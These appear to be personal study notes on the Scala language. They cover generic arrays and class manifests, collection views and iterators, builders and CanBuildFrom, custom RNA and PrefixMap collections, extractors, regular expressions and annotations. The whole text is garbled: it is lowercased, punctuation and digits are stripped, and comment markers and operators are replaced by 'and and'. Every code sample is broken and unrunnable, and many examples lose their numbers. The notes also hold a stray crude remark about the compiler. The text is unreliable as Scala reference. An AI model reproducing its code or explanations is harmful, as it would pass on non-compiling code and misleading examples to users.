the other is defined in a class scala lowpriorityimplicits  which is a superclass of predef implicits in subclasses and subobjects take precedence over implicits in base classes what s the story on generic arrays in java you cannot write t  how then scala s array t is represented a generic array could be at runtime any of java s primitive array types or it could be an array of objects and the only common runtime type encompassing all that is anyref  so that s the type scala compiler maps array t to at runtime when an element of an array of type array t is accessed or updated there is a sequence of type tests that determine the actual array type followed by the correct array operation on the java array since these tests slow down operations a bit you can expect access to generic arrays to be  to  times slower than to primitive or object arrays representing a generic array type is not enough there must also be a way to create generic arrays which is an even harder problem and and this is not enough doesn t compile def evenelems t xs vector t array t and and this could be e g an array int  or an array boolean and and or an array of some of the java primitive or an array of some reference type and and which all have different runtime representations val arr new array t xs length and  and  and and cannot find a class tag for type t for i  until xs length by  arr i and  xs i and and the reason why scala runtime cannot pick the type is type erasure and and the actual type that corresponds to the type t is erased at runtime and and it is required that you provide a runtime type hint to the compiler and and this hint takes the form of a class manifest of type scala reflect classmanifest and and a class manifest is a type descriptor object that describes what the top level class and and of a type is and and there s also a full manifest scala reflect manifest  that describes all aspects and and of a type but for array creation only a class manifest is needed and and the compiler will generate code to construct and pass class manifests automatically and and if you demand a class manifest as an implicit parameter def evenelems t xs vector t implicit m classmanifest t array t val arr new array t xs length and  and  for i  until xs length by  arr i and  xs i and and or written shorter with type context bound def evenelems t classmanifest xs vector t array t val arr new array t xs length and  and  for i  until xs length by  arr i and  xs i and and the two versions of evenelems are exactly the same and and when the array t is constructed the compiler looks for a class manifest for and and the type parameter t  that is it looks for an implicit value of type and and classmanifest t and if such a value is found the manifest is used to construct and and the right kind of array evenelems vector      and and array int array    evenelems vector compiler  of scala  is  not  a bitch and and compiler automatically constructed a class manifest for the element type and and and passed it to the implicit parameter of evenelems and and compiler can do that for all the concrete types but not if the argument is itself and and another type parameter without its class manifest def wrap u xs vector u evenelems xs and and no classmanifest available for u and and not enough arguments for method evenelems and and unspecified value parameter evidence  def wrap u classmanifest xs vector u evenelems xs and and wrap u xs vector u implicit evidence  classmanifest u array u and and the context bound in the definition of u is just a shorthand for an implicit and and parameter named here evidence  of type classmanifest u so generic array creation demands class manifests whenever you create an array of type parameter t  you also need to provide an implicit class manifest for t the easiest way to do that is to declare the type parameter with a classmanifest context bound like arrays strings are not directly sequences but they can be converted to them val str hell and and java lang string hello str reverse and and lleh str map  toupper and and hell str drop  and and l str slice   and and ell val s seq char str and and seq char wrappedstring h e l l  and and these operations are supported by two implicit conversions and and low priority conversion to wrappedstring  a subclass of immutable indexedseq and and which was applied in the last line above and and high priority conversion to stringops object which adds all immutable seq methods and and which was applied to support reverse  map  drop and slice different collection types have different performance characteristics which is

sequences collections of different categories are always unequal even if they contain the same elements withing a category collections are equal only if they have the same elements for sequences elements must be in the same order  e g list    vector    for equality check it s irrelevant whether a collection is mutable of immutable you have to be careful not to use mutable collections as a key in a hash map import collection mutable hashmap arraybuffer val buf arraybuffer    and and mutable arraybuffer int arraybuffer    val map hashmap buf  and and mutable hashmap mutable arraybuffer int  int map arraybuffer      map buf and and  buf  and  map buf and and java util nosuchelementexception key not found arraybuffer    methods that construct new collections are called transformers  because they take at least one collection as their receiver object and produce another collection e g map  filter  and and transformers can be implemented in two principal ways strict and non strict lazy a strict transformers construct a new collection with all of its elements whereas lazy transformers construct only a proxy for the result collection where its elements are constructed on demand def lazymap t u coll iterable t  f t u new iterable u def iterator coll iterator map f and and lazymap constructs a new iterable without stepping through all elements of the and and given collection and and the given function f is instead applied to the elements of the new collection s and and iterator as they are demanded scala collections are by default strict in all their transformers except stream  which implements all its transformer methods lazily there is a systematic way to turn every collection into a lazy one and vice versa which is base on collection views a view is a special kind of collection that represents some base collection but implements all its transformers lazily to go from a collection to its view you use the collection s view method to get back from a view to a strict collection you use the force method val v vector  to   and and immutable vector int vector      v map  and  map   and and immutable vector int vector      and and a note about vector creation and and if we had created the vector like this we would ve get range val v vector  to  and and vector immutable range inclusive vector range  and and the expression v map  and  constructs a new vector that is then transformed and and into a third vector by the second map expression and and we could ve used a single map with the composition of the two functions and and but that often isn t possible since the code resides in different modules and and a more general way to avoid the intermediate results is by first turning the and and vector into a view applying transformations to it and forcing the view to a vector v view map  and  map   force and and or one by one val vv v view and and collection seqview int vector int seqview and and the v view gives us a seqview  i e a lazily evaluated seq and and the type seqview has two type parameters int shows the type of view s elems and and and the vector int shows the type constructor we get back when forcing the view and and applying the first map to the view gives us val resinter vv map  and  and and seqview intseq  seqviewm and and seqview is in essence a wrapper that records the fact that a map with and and function  and  needs to be applied on the vector v and and it does not apply that map until the view is forced and and the m after seqview is an indication that the view encapsulates a map operation and and other letters indicate other delayed operations s for slice  r for reverse and and we now apply the second map to the last result val res resinter map   and and seqview int seq  seqviewmm and and we now get a seqview that contains two map operations so it prints with double m and and finally forcing the last result gives res force and and seq int vector      and and both stored functions get applied as part of the execution of the force operation and and that way no intermediate data structure is needed and and one detail to note is that the static type of the final result is a seq  and and not a vector and and tracing the types back we see that as soon as the first delayed map was applied and and the result had static type seqviewm int seq   that is the knowledge that and and the view was applied to the specific sequence type vector got lost and and the implementation of a view for any particular class requires quite a bit of code and and so the scala collection libraries provide view mostly only for general collection and and types not for specific implementations exception is array applying delayed and and operations on array will again give results with static type array there are two reasons why you might want to consider using views the first obviously performance and the second and and the problem of finding the first palindrome in a list of words def ispalindrome x string x x reverse def findpalindrome s seq string s find ispalindrome and and if words is a previously defined very long list of words findpalindrome words take  and and this always constructs an intermediary sequence consisting of million words and and so if the first word is a palindrome this would copy   words into the and and intermediary result without being inspected at all afterwards and and with views findpalindrome words view take  and and this would only construct a single lightweight view object and and views over mutable sequences and and many transformer functions on such views provide a window into the original sequence and and that can then be used to update selectively some elements of that sequence val arr  to  toarray and and array int array      and and we can create a subwindow into that array by creating a slice of a view of the array val subarr arr view slice   and and indexedseqview intarray int indexedseqviews and and this gives a view which refers to elements at position  through  of the array arr and and the view does not copy these elements it simply provides a reference to them and and now assume you have a method that modifies some elements of a sequence and and e g the negate method would negate all elements of the sequence it receives def negate xs collection mutable seq int for i  until xs length xs i xs i and and if you wanted to negate elements from positions  through  negate subarr arr and and array int array       and and negate changed all elements which were a slice of the elements of arr for smaller collections the added overhead of forming and applying closures in views is often greater than the gain from avoiding the intermediary data structures evaluation in views can be very confusing if the delayed operation have side effects it is recommended that you use views either in purely functional code where the collection transformations do not have side effects or that you apply them over mutable collections where all modifications are done explicitly a way to access elements of a collection one by one a call to it next returns the next element and advances the state of the iterator if there are no more elements next throws nosuchelementexception to avoid that we use hasnext method and and the most straightforward way to step through the elements returned by an iterator while it hasnext println it next and and iterators provide analogues of most of the methods of traversable  iterable and and and seq traits it foreach println and and for can be used instead of foreach  map  filter and flatmap for elem it println elem there is an important difference between foreach on iterators and the same method on traversable collections when called on an iterator foreach will leave the iterator at its end when it s done calling next yields nosuchelementexception  but when called on a collection it leaves the number of elements in the collection unchanged the other operations that iterator has in common with traversable all have the same property of leaving the iterator at its end when done iterating val it iterator a  b  is a  b and and iterator string non empty iterator val res it map  length and and iterator int non empty iterator res foreach print and and  it next and and java util nosuchelementexception next on empty iterator and and a method that finds the first word in an iterator that has at least two characters val it iterator a  member  of  words and and iterator string non empty iterator val it it dropwhile  length  and and iterator string non empty iterator it next and and string member it next and and string of it next and and string words and and there s only one standard operation duplicate  that allows reuse of an iterator val it it it duplicate and and duplicate returns a pair of iterators that work independently and and the original iterator it is advanced to its end by the duplicate operation iterators behave like collections if you never access an iterator again after invoking a method on it scala makes this explicit by providing an abstraction called traversableonce  which is a common supertrait of traversable and iterator traversableonce object can be traversed using foreach  but the state of that object after the traversal is not specified if the traversableonce object is an iterator  it will be at its end but if it s a traversable  it will still exist as before a common use case for traversableonce is to use it as an argument type for methods that can take either an iterator or traversable e g appending method and and in trait traversable  which takes a traversableonce parameter so you can append elements coming from either an iterator or a traversable collection all operations in trait iterator  abstract methods it next

way conversions iterator java util iterator iterator java util enumeration iterable java util iterable iterable java util collection mutable buffer java util list mutable set java util set mutable map

list  and and on which all attempted mutations will throw an unsupportedoperationexception val jul java util list int list    and and java util list int    jul add  and and java lang unsupportedoperationexception at java util abstractlist add the design approach was to implement most operations in collection templates that can be flexibly inherited from individual base classes and implementations almost all collection operations are implemented in terms of traversals and builders traversals are handled by traversable s foreach method and building new collections is handled by instances of class builder and and abbreviated outline of the builder class package scala collection generic class builder elem and to def and elem elem this type def result to def clear def mapresult f to newto bulder elem newto and and you can add an element to a builder with b and x  or more than one element with b and x y or with b and and xs works same as for buffers which are in fact enriched version of builders the result method returns a collection from a builder the state of builder is undefined after taking its result but it can be reset into a new clean state using clear builders are generic in both the element type elem and in the type to  of collections they return and and to use arraybuffer to produce a builder that builds arrays val buf new arraybuffer int and and mutable arraybuffer int arraybuffer val bldr buf mapresult  toarray and and mutable builder int array int arraybuffer and and the result value bldr is a builder that uses the array buffer to collect elems and and when a result is demanded from bldr  the result of buf is computed which and and yields the array buffer but itself and and this array buffer is then mapped with  toarray to an array and and so the end result is that bldr is a builder for arrays scala collection library avoids code duplication and achieves the same result type principle by using generic builders and traversals over collections in so called implementation traits these traits are named with a like suffix e g indexedseqlike is the implementation trait for indexedseq collection classes such as indexedseq or traversable inherit all their concrete method implementations from these traits implementation traits have two type parameters instead of usual one for collections because they parameterize not only over the collection s element type but also over the collection s representation type i e the type of the underlying collection such as seq i or list t and and the header of the trait traversablelike trait traversablelike and elem and repr and and type parameter elem element type of traversable and and type parameter repr representation type of elements there are no constraints on repr  it might be instantiated to a type that is itself not a subtype of traversable that way classes like string and array can still make use of all operations defined in a collection implementation trait e g filter is implemented once for all collection classes in the trait traversablelike and and implementation of filter in traversablelike package scala collection class traversablelike and elem and repr def newbuilder builder elem repr and and deferred to concrete implementation classes def foreach u f elem u and and deferred def filter p elem boolean repr val b newbuilder and and first constructs a new builder for the representation type foreach elem if p elem b and elem and and traverses all elems of the collection and and and if an elem satisfies p adds it to the builder b result and and finally all elems collected in the builder are returned and and as an instance of the repr collection type by calling result a bit more complicated is the map operation on collections for example if f is a function from string to int  and xs is a list string  then xs map f should give a list int  but if xs is an array string  then the same expression should return array int how does scala achieve that without duplicating implementations of the map methods in both list and array the newbuilder foreach combination is not enough since it only allows creation of new instances of the same collection type on top of that requirement there s a problem that even the result type constructor of a function like map might depend in non trivial ways on the other argument types import collection immutable bitset val bits bitset    and and immutable bitset bitset    bits map   and and bitset    bits map  tofloat and and immutable set float set       and and if you map the doubling function over a bit set you get another bit set back and and but if you map the function tofloat over the same bit set you get set float and and because bit sets can only contain ints the map s result type depends on the type of function that s passed to it if the result type of that function stays int the result will be bit set but if the result type of the function argument is something else the result is just a set and and the problem is of course not just with bit sets map a  b  map case x y y x and and map int string map  a b map a  b  map case x y y and and iterable int list   and and second function maps key and value pair to integer in which case we cannot form a map and and but we can still form an iterable a supertrait of map and and every operation that s legal on iterable must also be legal on a map scala solves this problem with overloading that s provided by implicit parameters and and implementation of map in traversablelike def map b that p elem b implicit bf canbuildfrom b that this that val b bf this for x this b and f x b result and and where filter used the newbuilder method map uses a builder factory that s and and passed as an additional implicit parameter of type canbuildfrom package scala collection generic trait canbuildfrom from elem and to def apply from from builder elem to and and creates a new builder and and elem indicates the element type of the collection to be built and and to indicates the type of collection to be built and and from indicates the type for which this builder factory applies and and e g bitset s companion object would contain a builder factory of type and and canbuildfrom bitset int bitset  which means that and and when operating on bitset you can construct another bitset provided the type of the and and collection to build is int and and if this is not the case you can always fall back to different more general and and implicit builder factory implemented in mutable set s companion object canbuildfrom set   a set a and and which means that when operating on an arbitrary set set   you can build a set and and again no matter what the element type a is and and given various implicit instances of canbuildfrom  you can rely on scala s implicit and and resolution rules to pick the one that s appropriate and maximally specific and and but what about dynamic types val xs iterable int list    and and iterable int list    val ys xs map x x x and and iterable int list    and and the static type ys is iterable as expected but its dynamic type is still list and and this is achieved by one more indirection the apply method in canbuildfrom is and and passed the source collection as argument and and all builder factories for generic traversables except for leaf classes forward the and and call to a method genericbuilder of a collection which in turn calls the builder and and that belongs to the collection in which it is defined and and so scala uses static implicit resolution to resolve constraints on the types of map and and and virtual dispatch to pick the best dynamic type that corresponds to these and and constraints integrating sequences and and sequence type for rna strands a t g u abstract class base case object a extends base case object t extends base case object g extends base case object u extends base object base val fromint int base array a t g u val toint base int map a  t  g  u  and and rna strands class v import collection indexedseqlike import collection mutable builder arraybuffer import collection generic canbuildfrom and and rna strands can be very long so we re building our own collection to optimize and and since there are only  bases a base can be uniquely identified with  bits and and so you can store  bases in an integer and and we ll create a specialized subclass of seq base and and groups represents packed bases  in each array elem except maybe in last and and length specifies total number of bases on the array and and private  so clients cannot instantiate it with new hiding implementation final class rna private val groups array int  val length int and and parametric fields extends indexedseq base and and indexedseq has length and apply methods import rna  def apply idx int base if idx  and and length idx throw new indexoutofboundsexception and and extract int value from the groups  then extract  bit number base fromint groups idx and n idx n s m object rna private val s  and and number of bits necessary to represent group private val n  and and number of groups that fit into int private val m  s  and and bitmask to isolate a group lowest s bits in a word and and converts given sequence of bases to instance of rna def fromseq buf seq base rna val groups new array int buf length and n  and n for i  until buf length and and packs all the bases groups i and n and base toint buf i i n s and and bitwise or equals new rna groups buf length def apply bases base fromseq bases and and using rna val xs list a g t a and and list product with base list a g t a rna fromseq xs and and rna a g t a val rna rna a u g g t and and rna a u g g t println rna length and and int  println rna last and and base t println rna take  and and indexedseq base vector a u g and and the last line returns vector  as the default implementation of indexedseq  since and and all we did in class rna was extend indexedseq  which used its take method and and which doesn t know how to handle bases and and we might override method take def take count int rna rna fromseq super take count and and which would take care of take  but what about drop  filter or init and and we would have to override over  methods on sequences that return a sequence and and there is a way the rna class needs to inherit not only from indexedseq  but and and also from its implementation trait indexedseqlike final class rna private val groups array int  val length int extends indexedseq base with indexedseqlike base rna import rna  override def newbuilder builder base rna new arraybuffer base mapresult fromseq def apply idx int base and and same as before and and indexedseqlike trait implements all concrete methods of indexedseq and and the return type of methods like take  drop  filter is the second type parameter and and passed to class indexedseqlike  rna and and to be able to do this indexedseqlike uses the newbuilder abstraction which and and creates a builder of the right kind and and subclasses of trait indexedseqlike have to override newbuilder to return and and collections of their own kind builder base rna  in case of rna class and and it first creates an arraybuffer  which is itself a builder base arraybuffer and and it then transforms the arraybuffer builder to an rna builder by calling its and and mapresult method and and mapresult expects a transformation function from arraybuffer to rna as param and and the function we send is simply rna fromseq  which converts an arbitrary base and and sequence to an rna value array buffer is a kind of sequence so fromseq works there are methods that might return the same kind of collection but with a different element type e g map if s is a seq int  and f is a function from int to string  then s map f would return a seq string  meaning that the element type changes between the receiver and the result but the type of collection stays the same there are a number of methods that behave the same as map  like flatmap  collect  and even the append and and method which also may return a result of a different type e g appending a list of string to a list of int would give a list of any we can accept the rule that mapping bases to bases over an rna strand would yield again an rna strand but mapping bases to some other type necessarily results in a different type and and mapping to the same type val rna rna a u g g t rna map case a t case b b and and vector a u g g t rna and and rna and and vector a u g g t a u g g t and and but mapping to some other type rna map base toint and and indexedseq int vector      rna and and list ie  eg and and indexedseq java lang object vector a u g g t ie eg and and to figure out a better way first look at the signature of the map method and and which is originally defined in class scala collection traversablelike def map b that f a b implicit cbf canbuildfrom repr b that that and and a type of elements of the collection and and repr type of the collection itself gets passed to traversablelike indexedseqlike and and b result type of the mapping function elem type of the new collection and and that result type of map type of the new collection that gets created and and how is the type of that determined and and it is linked to the other types by an implicit parameter cbf  and and these cbf implicits are defined by the individual collection classes and and canbuildfrom repr b that says here is a way given a collection of type from  and and to build with elements of type elem a collection of type to and and now it s clear there was no canbuildfrom instance that creates rna sequences and and so the next best thing available was used canbuildfrom of the companion object and and of the inherited trait indexedseq  which creates indexed seqs and and to address this we need to define an implicit instance of canbuildfrom in the and and companion object of the rna class which should be canbuildfrom rna base rna and and which states that given an rna and a new element type base  we can build and and another collection which is again rna final class rna private val groups array int  val length int extends indexedseq base with indexedseqlike base rna import rna  and and mandatory re implementation of newbuilder in indexedseq override protected this def newbuilder builder base rna rna newbuilder and and mandatory implementation of apply in indexedseq def apply idx int base if idx  and and length idx throw new indexoutofboundsexception base fromint groups idx and n idx n s m and and optional implementation of foreach to make it more efficient and and for every selected array elem it immediately applies given function to all bases and and contained in it as opposed to default foreach  which simply selects every i th and and elem using apply override def foreach u f base u unit var i  var b  while i length b if i n  groups i and n else b s f base fromint b m i and  object rna private val s  private val m  s  private val n  and s def fromseq buf seq base rna val groups new array int buf length and n  and n for i  until buf length groups i and n and base toint buf i i n s new rna groups buf length def apply bases base fromseq bases and and implementation moved here from the rna class only a call to this one left there def newbuilder builder base rna new arraybuffer mapresult fromseq implicit def canbuildfrom canbuildfrom rna base rna new canbuildfrom rna base rna and and these two are useful for adapting the dynamic type of builder s return type and and to be the same as the dynamic type of the receiver not in play here final def apply builder base rna newbuilder def apply from rna builder base rna newbuilder integrating new sets and maps how to integrate new kind of map into the collection framework e g a mutable map with string as the key type by a patricia trie  where patricia stands for  practical algorithm to retrieve information coded in alphanumerics  the idea is to store a set or a map as a tree where subsequent character in a search key uniquely determines a descendant tree e g patricia trie that stores strings abc  abd  al  all and xy would look like the following image to find a node corresponding to the string abc  you d simply follow the subtree labeled a  then proceed to subtree b  to finally reach its subtree c if it s used as a map the value associated with a key is stored in nodes that can be reached by that key if it s a set you simply store a marker saying that the node is present in the set patricia tries support very efficient lookups and updates another great feature is that they support selecting a subcollection by giving a prefix e g to find a subcollection of all keys that start with an a  you simply follow the a link from the root of the tree and and prefixmap implementation patricia trie based and and by prefix we want to say that our map has method withprefix  that selects and and a submap of all keys starting with a given prefix import collection  class prefixmap t extends mutable map string t with mutable maplike string t prefixmap t and and inheriting maplike serves to get the right result type for transformations and and such as filter var suffixes immutable map char prefixmap t map empty and and immutable maps with small number of elems are more efficient than mutable maps var value option t none def get s string option t if s isempty value and and simply select the optional value stored in the root and and try to select the submap corresponding to the first char or the string and and if that yields a submap follow up by looking up the remainder of the key and and after its first char and if the key is not found return none and and when a flatmap is applied to an optional value and a closure which returns and and an optional value  ov flatmap f will succeed if both ov and f return a and and defined value otherwise it returns none else suffixes get s  flatmap  get s substring  def withprefix s string prefixmap t if s isempty this else val leading s  suffixes get leading match case none suffixes suffixes and leading empty case  suffixes leading withprefix s substring  override def update s string elem t and and first locates the key by calling withprefix  creating submaps if not in tree withprefix s value some elem override def remove s string option t and and similar to get  only it if s isempty val prev value value none prev and and first sets nodes to none else suffixes get s  flatmap  remove s substring  and and returns iterator that yields all key value pairs from the map and and if the map contains a defined value some x  in the value field at its root and and then  x is the first element returned from the iterator and and the iterator needs to traverse the iterators of all submaps stored in the suffixes and and field but it needs to add a character in front of every key string returned by and and those iterators and and if m is the submap reached from the root through a character chr  and s v and and is an element returned from m iterator  then the root s iterator will return and and chr and s v instead def iterator iterator string t and and option values define an iterator method that returns either no element if the and and option value is none  or exactly one element x  if the option is some x for v value iterator yield  v and and for chr m suffixes iterator s v m iterator yield chr and s v and and since maps and sets come with default builders which are instances of mapbuilder  and and there s no need to implement the newbuilder method def and kv string t this type update kv  kv  this def s string this type remove s this and and to build the right kind of set or map we need to start with an empty set or map of and and this kind thus the empty method override def emtpy new prefixmap t import scala collection mutable builder mapbuilder import scala collection generic canbuildfrom and and the main purpose of this object is to define some convenience factory methods and and and to define a canbuildfrom implicit to make typing work better object prefixmap extends def empty t new prefixmap t and and methods empty and apply allow us to write prefixmap literals def apply t kvs string t prefixmap t val m prefixmap t empty for kv kvs m and kv def newbuilder t builder

prefixmap int map hello   hi  val epm prefixmap empty string and and prefixmap string map and and made possible by canbuildfrom and and consider mapping a function over the key value pairs of a prefixmap and and as long as that function produces pairs of strings and some other type the resulting and and collection will again be a prefixmap and and without canbuildfrom implicit the result would have been a general mutable map pm map case k v k and  x v and and prefixmap string map hello  xxxxx  hi  xx to summarize if you want to fully integrate a new collection class into the collection framework you need to pay attention to the following decide whether the collection should be mutable or immutable pick the right traits for the collection inherit from the right implementation trait to implement most collection operations if you want map and similar operations to return instances of your collection type provide an implicit canbuildfrom in your class s companion object until now constructor patterns were linked to case classes but sometimes you might want to write patterns like this without creating an associated case class moreover you may wish to be able to create your own kinds of patterns that are decoupled from an object s representation enter extractors and and given a string we want to decide whether it s an email address and it it is and and we want to extract user and domain parts of the address and and the traditional way def isemail s string boolean def domain s string string def user s string string and and and then if isemail s println user s and at and domain s else println wtf and and lets assume that we could match a string with a pattern email user domain and and the pattern would match if the string contained an embedded sign in which case and and it would bind variable user to the part of the string before it and variable and and domain to the part after it and and the previous expression could be written more clearly like this s match case email user domain println user and at and domain case  println wtf and and to find two successive emails with the same user part ss match case email u d email u d  if u u case  an extractor is an object that has a method called unapply as one of it members whose purpose is to match a value and take it apart often times the extractor object also defines a dual method apply for building values but that s not required and and extractor object for e mail addresses object email and and the injection method optional def apply user string domain string user and and domain and and the extraction method mandatory def unapply str string option string string and and returns option type over pair of strings since it must handle the case where and and received param is not an email address val parts str split if parts length  some parts   parts  else none and and apply is used to turn email into an object that can be applied to arguments in and and parentheses in the same way a method is applied so you can write email john  epfl ch and and to construct the string john epfl ch and and to make this more explicit we could also let email inherit from function type object email extends string string string and and string string string is the same as function string string string  and and which declares an abstract apply method that email implements and and as a result of this inheritance declaration we could pass email to a method and and that expects a function string string string unapply john epfl ch equals some john  epfl ch unapply john doe equals none and and a side note when passing a tuple to a function that takes a single argument we and and can leave off one pair of parentheses so instead of some user domain we and and can write some user domain and and whenever pattern matching encounters a pattern referring to an extractor object and and it invokes the extractor s unapply method on the selector expression selectorstring match case email user domain and and will be turned into the call email unapply selectorstring and and which returns either none or some u d and and in the none case the pattern doesn t match and the system tries another pattern and and or fails with a matcherror exception and and in the previous example selectorstring matched the argument type of unapply  but and and that is not necessary and it would also be possible to use the email extractor and and to match selector expressions for more general types val x any x match case email user domain and and here the pattern matcher will first check whether the given value x conforms to and and string  the parameter type of unapply method and if it does the value is cast and and to string and pattern matching proceeds as normal and and if it doesn t conform the pattern fails immediately in object email  the apply method is called injection  because it takes some arguments and yields an element of a given set a set of strings that are email addresses in this case the unapply method is called extraction  because it takes an element of the same set and extracts some of its parts the user and domain substrings in this case injection and extraction are often grouped together in one object because then you can use the object s name for both a constructor and a pattern which simulates the convention for pattern matching with case classes it is also possible to define an extraction in an object without a corresponding injection when the object itself is called an extractor  regardless of whether or not it has an apply method and and if an injection method is included it should be dual to the extraction method and and e g a call to email unapply email apply user domain and and should return some user domain and and going in the other direction means running first the unapply and then apply email unapply obj match case some u d email apply u d and and where if the match on obj succeeds we expect to get back that same object from and and the apply the duality of apply and unapply is a good design principle which is not enforced by scala of course but it s recommended when designing extractors to bind n variables unapply returns an n element tuple wrapped in a some the case when a pattern binds just one variable is treated differently since there s no one tuple in scala so to return just one pattern element the unapply method simply wraps the element itself in a some and and extractor object for strings that consist of a substring appearing twice in a row object twice def apply s string string s and s def unapply s string option string val length s length and  val half s substring  length if half s substring length some half else none it is also possible that an extractor pattern does not bind any variables in which case the corresponding unapply returns a boolean true for success and false for failure and and extractor object that characterizes strings consisting of all uppercase letters object uppercase def unapply s string boolean s touppercase s and and it would make no sense to define apply  because there s nothing to construct and and function that applies all previously defined extractors def usertwiceupper s string s match case email twice x uppercase  domain match and x and in domain and domain case  no match and and uppercase is written with parentheses since without them the match would test for and and equality with the object uppercase and and x uppercase associates variable x with the pattern matched by uppercase usertwiceupper cancan gmail com and and match can in domain gmail com usertwiceupper cancam gmail com and and no match usertwiceupper cancan gmail com and and no match if you don t know the number of element values in advance the previous method is not flexible enough and and match on a string representing domain name and extract all domain parts and and in the end we should be able to use it like this dom match and and domains are in reverse order so it better fits sequence patterns case domain org  acm println acm org case domain com  sun  java println java sun com case domain net   println a net domain and and a sequence wildcard pattern   at the end of an argument list matches any remaining and and elements in a sequence which is more useful if top level domains come first and and because then we can use wildcard to match sub domains of arbitrary length the question of supporting vararg matching remains since the unapply methods are not sufficient because they return a fixed number of sub elements in the success case to handle this case scala lets you define a different extraction method specifically for vararg matching which is called unapplyseq object domain and and the injection optional def apply parts string string parts reverse mkstring and and the extraction mandatory and and first splits on periods then reverses and wraps in some def unapplyseq whole string option seq string and and must return option seq t some whole split reverse and and to search for an email address luka bonaci in some hr domain def islukabonaciindothr s string boolean s match case email luka bonaci  domain hr   true case  false and and it s also possible to return some fixed elements from unapplyseq  together with the and and variable part which is expressed by returning all elements in a tuple where the and and variable part comes last as usual and and e g extractor for emails where the domain part is already expanded into sequence object expandedemail and and returns optional value of a pair tuple  where the first part is the user and and and the second part is a sequence of names representing the domain def unapplyseq email string option string seq string val parts email split if parts length  some parts   parts  split reverse none val s luka support epfl hr val expandedemail name topdom subdoms  s and and name string luka and and topdom string hr and and subdoms seq string wrappedarray epfl support sequence patterns such as list  list x y   array x   are implemented using extractors in the standard scala library e g patterns of the form list are possible because the scala list companion object is an extractor that defines unapplyseq method and and list companion object similar for array package scala object list def apply t elems t elems tolist and and lets you write e g list   or list and and returns all elements as a sequence def unapplyseq t x list t option set t some x even though case classes are very useful they have a shortcoming of exposing the concrete representation of data because the name of the class in a constructor pattern corresponds to the concrete representation type of the selector object if a match against case c succeeds you know that the selector expression is an instance of class c extractors break this link between data representation and patterns by allowing patterns that have nothing to do with the data type the the object that s matched against this property is called representation independence  and it is known to be very important in open systems of large scale because it allows you to change an implementation type used in a set of components without affecting clients of these components on the other hand case classes have their advantages over extractors case classes are much easier to set up and define thus requiring less code they usually lead to more efficient pattern matches than extractors because compiler can optimize patterns over case classes much better than those over extractors because the mechanisms of case classes are fixed whereas an unapply or unapplyseq in an extractor could do almost anything if your case classes inherit from a sealed base class the compiler will check your pattern matches for exhaustiveness and will complain if some combination of possible values is not covered by a set of patterns which is not available with extractors if you re writing a closed application you should prefer case classes but if you need to expose an api to clients extractors might be preferable a particularly useful application area of extractors since they make it much nicer to interact with regular expressions library scala util matching forming regular expressions scala inherits its regex syntax from java which in turn inherits it from perl import scala util matching regex val decimal new regex d and d and and regex d and d and and like in java we need to escape backslashes which can be painful to write and read and and scala provides raw strings to help with that and and the difference between raw and normal string is that all characters in a raw string and and appear exactly as they are typed so we can write val decimal new regex d and d and and regex d and d and and another even shorter way val decimal d and d r and and regex d and d and and appending r to a string creates regular expression method of stringops searching for regular expressions val input for   to  by  for s decimal findallin input println s and and and     decimal findfirstin input and and option string some   decimal findprefixof input and and option string none must be at the start of a string extracting with regular expressions every regex defines an extractor which is used to identify substrings that are matched by the groups of the regular expression and and we could decompose a decimal number like this val decimal sign integerpart decimalpart   and and sign string and and integerpart string  and and decimalpart string  and and the decimal regex value defines unapplyseq  which matches every string that and and corresponds to the regex syntax for decimal numbers and and if the string matches the parts that correspond to the  groups in the regex and and are returned as elements of the pattern and are then matched by the  pattern and and variables sign  integerpart and decimalpart and and if a group is missing the element value is set to null val decimal sign integerpart decimalpart   and and sign string null integerpart  decimalpart  and and it is also possible to mix extractors with regular expression searches in a for and and expression for decimal s i d decimal findallin input println sign and s and  integer and i and  decimal and d structured information added to program source code not valid scala expressions may be added to any variable method expression or other program element a meta programming tool program that take other programs as input the compiler understands just one feature annotations but it doesn t attach any meaning to individual annotations example use cases a documentation generator instructed to document certain methods as deprecated a pretty printer instructed to skip over parts of the program that have been carefully hand formatted a checker for non closed files instructed to ignore a particular file that has been manually verified to be closed a side effects checker instructed to verify that a specified method has no side effects a typical use of an annotation looks like this deprecated def bigmistake and and applies to the entirety of the bigmistake method deprecated class quickanddirty and and e unchecked match and and applied to expressions and and non exhaustive cases and and annotations have a richer general form annot exp exp and and parentheses are optional if annotation has no arguments and and where annot specifies the class of annotation and and the precise form of the arguments you may give to annotation depends on the particular and and annotation class compiler supports arbitrary expressions as long as they type check and and some annotation classes can make use of this e g to let you refer to a variable cool val normal hello coolerthan normal val fonzy hot internally scala represents an annotation as just a constructor call of an annotation class replace with new and you have a valid instance creation expr a somewhat tricky bit concerns annotations that take other annotations as arguments and and we cannot write an annotation directly as an argument to an annotation because they and and are not valid expressions and and in such cases we must use new instead of import annotation  class strategy arg annotation extends annotation class delayed extends annotation strategy delayed def f and and error illegal start of simple expression strategy new delayed def f and and f unit introduced for features that are used widely enough to alter the language specification yet not fundamental enough to merit their own syntax deprecation used when there s a need to purge some classes or methods from the specification lets us gracefully remove a method or a class that turns out to be a mistake since we cannot simply delete a language element because clients code might stop working we mark a class or a method as deprecated by simply writing deprecated before its declaration such an annotation will cause the compiler to emit deprecation warning whenever scala code accesses the language element deprecated def bigmistake and and and and if you provide a string as an argument that string will be emitted along with warning deprecated use newshinymethod instead def bigmistake and and and and now any caller will get a message like this scalac deprecation deprecation scala and and deprecation scala  warning method bigmistake in object deprecation is and and deprecated use newshinymethod instead and and bigmistake and and one warning found volatile fields concurrent programming does not mix well with shared mutable state and for this reason the focus of scala s concurrency support is message passing and a minimum of shared mutable state the volatile annotation helps in cases when developers use mutable state in their concurrent programs it informs the compiler that a variable will be used by multiple threads such variables are implemented so that reads and writes of the variable value is slower but accesses from multiple threads behave more predictably we get the same behavior as if we marked the variable with volatile modifier in java binary serialization a serialization framework lets us convert objects into streams of bytes and vice versa which is useful if we want to save objects to disk or transfer over network scala doesn t have its own serialization framework instead you should use a framework of the underlying platform scala provides  annotations that are useful for a variety of frameworks and also the compiler interprets these annotations in the java way serializable marks a class as serializable all classes are considered non serializable by default serialversionuid n helps to deal with serializable classes future changes by providing a serial number to a class version which the framework stores in the generated byte stream later when we reload that byte stream and try to convert it to an object the framework checks that the current version of the class has the same version number as the version in the byte stream if not the framework refuses to load the old instances of the class so if you want to make a serialization incompatible changes to the class change the version number transient works the same as java transient field modifier field is excluded from serialization when its parent object is serialized automatic get and set methods scala code normally doesn t need explicit getters and setters for fields because scala blends the calling syntax for field access and method invocation because some platform specific frameworks do expect get and set methods scala provides scala reflect beanproperty annotation which tells the compiler to 